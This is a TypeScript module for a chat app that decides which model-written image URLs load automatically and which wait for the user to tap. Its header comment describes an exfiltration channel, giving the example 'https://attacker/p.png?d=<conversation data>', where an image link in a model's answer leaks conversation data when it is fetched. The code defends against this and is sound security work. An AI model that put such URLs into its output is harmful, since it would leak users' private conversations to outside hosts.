/**
 * Which image URLs may load without a tap (security review H1). Model-written URLs (markdown `![](…)`, `image.url`,
 * `gallery[].url`, source favicons) are an exfiltration channel: `https://attacker/p.png?d=<conversation data>`
 * would be fetched as soon as the block completes. Auto-loaded are only:
 *  - local / inline schemes from our own pipeline (data:image, blob:, file:, content:, ph:, assets-library:);
 *  - Wikimedia / Wikipedia hosts (the keyless image resolver);
 *  - exact URLs returned by our own image search (bridge or own key) – registered via `markTrustedImageUrl`;
 *  - the origins of the user's own servers (signed attachment URLs of the adapter/bridge) – `setTrustedImageOrigins`.
 * Everything else shows a "Bild laden (von host)" placeholder, unless Settings → Medien → "Bilder von unbekannten
 * Seiten" is "Immer laden". A tap unlocks that URL for the rest of the session. Answer images the bridge can proxy
 * load at once unless the setting is "Erst nach Tippen" (proxiedImagesAutoLoad, itemImage.ts).
 * Pure module state + a hook; the decision functions are tested in trust.test.ts.
 */
import { useSyncExternalStore } from 'react';

/**
 * Settings → Medien → "Bilder von unbekannten Seiten":
 *  - `bridge` (default, recommended): answer images that the user's bridge can proxy (products / places cards) load
 *    at once THROUGH the bridge – the image host sees the bridge, never the phone; every other unknown URL waits for
 *    a tap;
 *  - `tap`: every image whose address comes from an answer waits for a tap, also those the bridge could proxy;
 *  - `always`: everything loads at once (through the bridge where possible, otherwise directly from the site).
 */
export type UnknownImagePolicy = 'bridge' | 'tap' | 'always';
export const UNKNOWN_IMAGE_POLICIES: readonly UnknownImagePolicy[] = ['bridge', 'tap', 'always'];

/** Host suffixes whose images load without asking (Wikimedia Commons / Wikipedia thumbnails). */
export const TRUSTED_IMAGE_HOST_SUFFIXES: readonly string[] = ['wikimedia.org', 'wikipedia.org'];
const LOCAL_SCHEME = /^(data:image\/|blob:|file:|content:|ph:|assets-library:)/i;
const MAX_MARKED = 3000;

let policy: UnknownImagePolicy = 'bridge';
let origins = new Set<string>();
const marked = new Set<string>();
const unlocked = new Set<string>();
let version = 0;
const listeners = new Set<() => void>();
const bump = () => {
  version++;
  listeners.forEach((l) => l());
};

function parse(url: string): URL | null {
  try {
    const u = new URL(url);
    return u.protocol === 'https:' || u.protocol === 'http:' ? u : null;
  } catch {
    return null;
  }
}

/** Host name for the placeholder ("Bild laden (von example.com)"); '' when not an http(s) URL. */
export function imageHost(url: string): string {
  return parse(url)?.hostname.replace(/^www\./, '') ?? '';
}

export function isTrustedImageHost(host: string): boolean {
  const h = host.toLowerCase().replace(/\.$/, '');
  return TRUSTED_IMAGE_HOST_SUFFIXES.some((s) => h === s || h.endsWith(`.${s}`));
}

/** Trusted without asking? (does not look at the setting or session unlocks) */
export function isTrustedImageUrl(url: string | null | undefined): boolean {
  if (!url) return false;
  if (LOCAL_SCHEME.test(url)) return true;
  if (marked.has(url)) return true;
  const u = parse(url);
  if (!u || u.username || u.password) return false;
  if (u.protocol === 'https:' && isTrustedImageHost(u.hostname)) return true;
  return origins.has(u.origin);
}

/**
 * May an answer image load through the bridge image proxy without a tap? (`tap` policy: no – the proxied image waits
 * like any other unknown URL, imageLoadDecision of the ORIGINAL URL decides.)
 */
export function proxiedImagesAutoLoad(): boolean {
  return policy !== 'tap';
}

/** Final decision for one URL: load now, or show the tap-to-load placeholder. */
export function imageLoadDecision(url: string | null | undefined): 'load' | 'ask' {
  if (!url) return 'load'; // nothing to fetch
  if (isTrustedImageUrl(url) || unlocked.has(url)) return 'load';
  return policy === 'always' ? 'load' : 'ask';
}

/** Results of our own image search (and anything else the app itself resolved) → load without asking. */
export function markTrustedImageUrl(...urls: (string | null | undefined)[]): void {
  for (const u of urls) {
    if (!u || marked.has(u)) continue;
    if (marked.size >= MAX_MARKED) marked.delete(marked.values().next().value as string);
    marked.add(u);
  }
}

/** Origins of the user's own servers (profile base URLs): signed attachment links come from there. */
export function setTrustedImageOrigins(baseUrls: readonly string[]): void {
  const next = new Set<string>();
  for (const b of baseUrls) {
    const u = parse(b);
    if (u) next.add(u.origin);
  }
  if (next.size === origins.size && [...next].every((o) => origins.has(o))) return;
  origins = next;
  bump();
}

/** User tapped "Bild laden": this URL loads for the rest of the session. */
export function unlockImageUrl(url: string): void {
  if (unlocked.has(url)) return;
  unlocked.add(url);
  bump();
}

export function setUnknownImagePolicy(p: UnknownImagePolicy): void {
  if (p === policy) return;
  policy = p;
  bump();
}

export function getUnknownImagePolicy(): UnknownImagePolicy {
  return policy;
}

/** Tests only. */
export function resetImageTrustForTests(): void {
  policy = 'bridge';
  origins = new Set();
  marked.clear();
  unlocked.clear();
  bump();
}

const subscribe = (l: () => void) => {
  listeners.add(l);
  return () => {
    listeners.delete(l);
  };
};
const getVersion = () => version;

/** React: re-render on unlock / setting / origin changes (returns the trust-state version). */
export function useImageTrustVersion(): number {
  return useSyncExternalStore(subscribe, getVersion, getVersion);
}

/** React: may this image load now? Re-renders on unlock / setting / origin changes. */
export function useImageGate(url: string | null | undefined): { allowed: boolean; host: string; unlock: () => void } {
  useSyncExternalStore(subscribe, getVersion, getVersion);
  const allowed = imageLoadDecision(url) === 'load';
  return { allowed, host: url ? imageHost(url) : '', unlock: () => (url ? unlockImageUrl(url) : undefined) };
}
